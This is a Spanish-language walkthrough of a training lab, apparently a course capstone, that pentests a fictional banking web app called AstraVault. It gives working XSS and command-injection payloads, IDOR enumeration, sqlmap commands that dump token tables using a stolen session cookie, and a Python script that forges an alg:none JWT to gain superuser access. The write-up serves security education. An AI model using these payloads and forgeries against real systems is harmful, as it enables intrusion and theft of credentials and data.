# Contrato 4 — AstraVault (Web App Pentest)

- **Serie:** Cyber Security Contractor (Cyber Security 101)
- **Fecha:** 2026-10-06
- **Dominio:** Pentest de aplicación web (banca online) — el más completo
- **Acceso:** Attack Box / VPN contra target. Web en `http://<IP>/`
- **Credenciales de test:** pentest_user / [REDACTADO]

## Recorrido de técnicas
Info disclosure → dir enum → IDOR → XSS → MFA bypass → command injection → SQLi autenticado → JWT alg:none.

## Preguntas y comandos

### Q1 — Email de empleado en HTML source
`Ctrl+U` o:
```bash
curl -s http://<IP>/ | grep -iE "@|<!--"
```
Estaba en comentario HTML → **[REDACTADO]**

### Q2 — API key en archivo JS
```bash
curl -s http://<IP>/ | grep -iE "\.js"
curl -s http://<IP>/ruta/archivo.js | grep -iE "api|key|token"
```
→ **[REDACTADO]**

### Q3 — Portales de login (dir enum)
```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
Portales (no assets css/js/includes) → **[REDACTADO]**

### Q4 — IDOR en Transactions (ver a Jane Smith)
URL: `transactions.php?id=1` → iterar id (2,3,4...) hasta Jane Smith.
Descripción del depósito de $1,000 → **[REDACTADO]**

### Q5 — XSS en Offers (incident ID al inyectar alert)
Inyectar `<script>alert(1)</script>` en el campo de Offers.
La app muestra un incident ID → **[REDACTADO]**

### Q6 — Bypass MFA de password reset (employee)
Portal /employee → reset de password de james. Código MFA débil.
Código **[REDACTADO]** funcionó → reset exitoso (nueva pass `[REDACTADO]`).
→ **[REDACTADO]**

### Q7 — Command injection en File Search (leer CHANGELOG.md)
En el campo de búsqueda:
```
; cat /var/www/astravault/CHANGELOG.md
| cat /var/www/astravault/CHANGELOG.md
```
Diagnostic token en v0.7.3 → **[REDACTADO]**

### Q8 — SQLi en Customer (sacar service token)
Login employee con james / [REDACTADO]. Página: `customers.php?search=pentest_user` (GET).
Necesita cookie **EMPSESSID** (si expira, refrescar en DevTools).
```bash
sqlmap -u "http://<IP>/employee/customers.php?search=pentest_user" \
  --cookie="EMPSESSID=<valor>" --level=5 --risk=3 --batch --dbs
# BD = astravault
sqlmap -u "..." --cookie="EMPSESSID=<valor>" --level=5 --risk=3 --batch \
  -D astravault -T astravault_access_token --dump
```
⚠️ Problema inicial: `302 → login.php` = cookie expirada. Fix: cookie fresca + `--random-agent` si hace falta.
→ **[REDACTADO]**

### Q9 — JWT attack (portal admin, guest → superuser)
JWT en cookie, header `{"alg":"HS256"}`, payload `{"username":"guest","is_superuser":false,...}`.
rockyou NO crackeó el secreto HS256 → **ataque alg:none**:
```bash
python3 -c '
import base64, json
def b64(d): return base64.urlsafe_b64encode(json.dumps(d,separators=(",",":")).encode()).rstrip(b"=").decode()
h=b64({"alg":"none","typ":"JWT"})
p=b64({"username":"guest","is_superuser":True,"iat":1791351164,"exp":1791955964})
print(f"{h}.{p}.")'
```
Reemplazar la cookie JWT por el token forjado (acaba en `.`, firma vacía).
Al entrar al SQL Query Interface como superuser:
→ **[REDACTADO]**

### Q10 — Global token vía SQL Query Interface
Ya como superuser, en el SQL Query Interface:
```sql
SHOW TABLES;                      -- secretvault: global_token, users
SELECT * FROM global_token;
```
→ **[REDACTADO]**

## Respuestas
_Retiradas a propósito: no se publican las respuestas del capstone. La metodología está arriba._

## Aprendizajes
- **IDOR**: cambiar un `id=` en la URL para ver datos de otros.
- **XSS**: `<script>alert(1)</script>`, alternativas `<img src=x onerror=alert(1)>`.
- **Command injection**: separadores `;` `|` `&&` para encadenar comandos.
- **[REDACTADO]**: `--cookie`, cuidado con 302→login (cookie expirada).
- **JWT alg:none**: si el backend no valida bien, token sin firma con payload modificado. Primero intentar crackear el secreto HS256 (john/hashcat -m 16500).
